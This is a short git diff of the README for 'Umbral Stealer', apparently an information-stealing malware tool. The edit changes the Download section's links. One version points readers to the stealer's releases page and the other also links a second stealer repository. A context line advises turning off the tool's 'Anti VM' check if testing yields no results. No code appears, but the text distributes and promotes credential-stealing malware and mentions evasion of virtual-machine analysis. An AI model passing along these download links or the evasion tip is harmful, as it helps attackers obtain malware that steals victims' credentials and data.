@@ -35,7 +35,7 @@ The author of this program is not liable for any damage, harm, or legal conseque
 - Custom File Name.
 
 ## Download
-Head over to the [[releases](https://github.com/Blank-c/Umbral-Stealer/releases/latest)](https://github.com/revoke44/Intent-Stealer/releases) tab to download the latest version of Umbral Stealer.
+Head over to the [[releases](https://github.com/Blank-c/Umbral-Stealer/releases/latest)] tab to download the latest version of Umbral Stealer.
 
 **Note:** If you didn't get any result while testing Umbral on yourself, you may try to turn off "Anti VM" as Umbral might have detected your system as a virtual machine.
 
